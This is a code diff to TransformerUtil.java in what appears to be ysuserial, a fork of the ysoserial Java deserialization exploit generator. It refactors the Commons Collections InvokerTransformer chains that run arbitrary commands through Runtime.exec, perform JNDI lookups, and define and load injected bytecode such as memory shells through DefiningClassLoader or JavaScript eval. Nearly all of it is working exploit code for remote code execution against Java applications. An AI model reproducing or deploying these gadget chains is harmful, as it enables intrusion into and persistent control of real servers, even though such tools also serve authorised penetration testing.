@@ -1,5 +1,6 @@
 package org.su18.ysuserial.payloads.util;
 
+import javassist.CtClass;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
@@ -11,6 +12,7 @@ import java.net.URL;
 import java.net.URLClassLoader;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
+import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
 import static org.su18.ysuserial.payloads.util.Gadgets.*;
 import static org.su18.ysuserial.payloads.util.Utils.*;
 
@@ -59,10 +61,8 @@ public class TransformerUtil {
 
 			// 对 BCEL 也支持 EX 或 LF 扩展功能
 			if (command.startsWith("EX-") || command.startsWith("LF-")) {
-
-				IS_INHERIT_ABSTRACT_TRANSLET = false;
-				createTemplatesImpl(command);
-				bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(memShellClassBytes, memShellClassname, null).toBytecode());
+				CtClass ctClass = generateClass(command);
+				bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode(), ctClass.getName()).toBytecode());
 			} else {
 				bcelBytes = command;
 			}
@@ -71,16 +71,15 @@ public class TransformerUtil {
 		} else if (command.startsWith("JD-")) {
 			transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new ConstantTransformer(1)};
 		} else if (command.startsWith("EX-") || command.startsWith("LF-")) {
-			IS_INHERIT_ABSTRACT_TRANSLET = false;
-			createTemplatesImpl(command);
+			CtClass ctClass = generateClass(command);
 
 			if (USING_MOZILLA_DEFININGCLASSLOADER) {
 				// 使用 DefiningClassLoader 加载，不是所有 JDK 均有 org.mozilla.javascript.DefiningClassLoader
 				// 在 NC 中可以使用
-				transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{memShellClassname, memShellClassBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
+				transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
 			} else {
 				// 使用 ScriptEngineManager JS eval 加载
-				transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(memShellClassBytes, memShellClassname, null).toBytecode())})};
+				transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode(), ctClass.getName()).toBytecode())})};
 			}
 		} else {
 			transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
